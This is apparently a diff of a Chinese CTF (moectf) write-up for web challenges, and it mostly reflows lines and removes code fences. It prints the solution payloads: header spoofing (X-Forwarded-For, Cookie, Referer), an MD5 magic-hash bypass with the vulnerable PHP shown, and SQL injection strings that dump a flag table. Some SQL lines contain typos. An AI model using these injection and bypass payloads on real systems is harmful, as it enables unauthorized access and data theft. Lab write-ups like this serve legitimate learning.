@@ -43,7 +43,10 @@ asyncfunctiontestTalent() { try { const res = await fetch('/test_talent?level=S'
 
 Web4
 
-第一关：/stone_golem?key=xdsec第二关：/cloud_weaverPOST：declaration=织云阁=第一第三关：/shadow_stalkerX-Forwarded-For:127.0.0.1第四关：/soul_discernerUser-Agent:moe browser第五关：你需要以xt的身份认证user!/heart_sealCookie: user=xt第六关：你不是从http://panshi/entry来的吗？快回去！/pathfinderReferer:http://panshi/entry第七关：PUT /void_rebirth新生！
+第一关：/stone_golem?key=xdsec第二关：/cloud_weaverPOST：declaration=织云阁=第一第三关：/shadow_stalkerX-Forwarded-For:
+127.0.0.1第四关：/soul_discernerUser-Agent:
+moe browser第五关：你需要以xt的身份认证user!/heart_sealCookie: user=xt第六关：你不是从http://panshi/entry来的吗？快回去！/pathfinderReferer:
+http://panshi/entry第七关：PUT /void_rebirth新生！
 
 bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}
 
@@ -63,7 +66,8 @@ md5 弱比较
 
 Web8
 
-1'or(true)order by 2#1'or(true)order by 3#1'union select (select group_concat(table_name) from informations_schema.tables where table_name=database())2#1'union select (select group_concat(column_name) from information_schema.columnswheretable_schema=database() and table_name='flag'),2#1'union select (select group_concat(value) from user.flag),2#
+1'or(true)order by 2#1'or(true)order by 3#1'union select (select group_concat(table_name) from informations_schema.tables where table_name=database())2#1'union select (select group_concat(column_name) from information_schema.columnswheretable_schema=database() and table_name='flag'),2#1'union select (select group_concat(value) from user.flag),2
+#
 
 Web9
 
@@ -74,60 +78,19 @@ Web9
 
 ```
 document.querySelector('#passwordInput').value = CORRECT_PASSWORD;validatePassword();
-```
-
-
-
-```
 document.getElementById('passwordInput').removeEventListener('paste', handlePaste);
-```
-
-
-
-```
 POST /test_talent?level=SContent-Type: application/json{"manifestation":"流云状青芒"}
-```
-
-
-
-```
 asyncfunctiontestTalent() { try { const res = await fetch('/test_talent?level=S', { method:'POST', headers: {'Content-Type':'application/json','Accept':'application/json'}, body: JSON.stringify({ manifestation:'流云状青芒'}) }); const data = await res.json(); document.getElementById('result').textContent = data.result; const glow = document.getElementById('glow'); glow.style.opacity = /流云状青芒/i.test(data.result) ?'1':'0'; setTimeout(() => alert(`✨ 天道机缘：${data.flag}✨nn天赋篡天术大成！`), 500); } catch (e) { alert('玄轨连接中断！请检查灵枢...'); }}
-```
-
-
-
-```
-第一关：/stone_golem?key=xdsec第二关：/cloud_weaverPOST：declaration=织云阁=第一第三关：/shadow_stalkerX-Forwarded-For:127.0.0.1第四关：/soul_discernerUser-Agent:moe browser第五关：你需要以xt的身份认证user!/heart_sealCookie: user=xt第六关：你不是从http://panshi/entry来的吗？快回去！/pathfinderReferer:http://panshi/entry第七关：PUT /void_rebirth新生！
-```
-
-
-
-```
+第一关：/stone_golem?key=xdsec第二关：/cloud_weaverPOST：declaration=织云阁=第一第三关：/shadow_stalkerX-Forwarded-For:
+127.0.0.1第四关：/soul_discernerUser-Agent:
+moe browser第五关：你需要以xt的身份认证user!/heart_sealCookie: user=xt第六关：你不是从http://panshi/entry来的吗？快回去！/pathfinderReferer:
+http://panshi/entry第七关：PUT /void_rebirth新生！
 bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}
-```
-
-
-
-```
 1'or'1'='1
-```
-
-
-
-```
 <?phphighlight_file(__FILE__);$flag= getenv('FLAG');$a=$_GET["a"] ??"";$b=$_GET["b"] ??"";if($a==$b){ die("error 1");}if(md5($a) != md5($b)){ die("error 2");}echo$flag;
-```
-
-
-
-```
 /flag.php?a=QNKCDZO&b=240610708
-```
-
-
-
-```
-1'or(true)order by 2#1'or(true)order by 3#1'union select (select group_concat(table_name) from informations_schema.tables where table_name=database())2#1'union select (select group_concat(column_name) from information_schema.columnswheretable_schema=database() and table_name='flag'),2#1'union select (select group_concat(value) from user.flag),2#
+1'or(true)order by 2#1'or(true)order by 3#1'union select (select group_concat(table_name) from informations_schema.tables where table_name=database())2#1'union select (select group_concat(column_name) from information_schema.columnswheretable_schema=database() and table_name='flag'),2#1'union select (select group_concat(value) from user.flag),2
+#
 ```
 
 
